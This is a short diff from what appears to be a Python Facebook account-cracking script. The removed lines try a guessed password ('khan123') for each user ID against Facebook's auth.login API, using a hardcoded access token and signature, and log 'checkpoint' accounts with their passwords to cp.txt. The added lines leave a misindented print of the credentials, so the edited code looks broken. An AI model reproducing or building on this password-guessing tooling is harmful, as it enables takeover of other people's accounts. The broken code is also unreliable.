@@ -782,25 +782,11 @@ def menu_select():
 
 		                                                            oks.append(uid)
           
-                                                                    else:
-			
-                                                                  	pass8="khan123"
+                                                                    
+		                                                      	                                                            print("\x1b[1;93m[CHECKPOINT] "+uid+" | "+pass8)
 
-		                                                        q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
-
-		                                                        d=json.loads(q)
-
-		                                                        if 'www.facebook.com' in d['error_msg']:
-
-		                                                            print("\x1b[1;93m[CHECKPOINT] "+uid+" | "+pass8)
-
-		                                                            cp=open("cp.txt","a")
-
-		                                                            cp.write(uid+" | "+pass8+"\n")
-
-		                                                            cp.close()
-
-		                                                            cps.append(uid)
+		                                                            
+		                                                            
 
 		                                                    else:
 
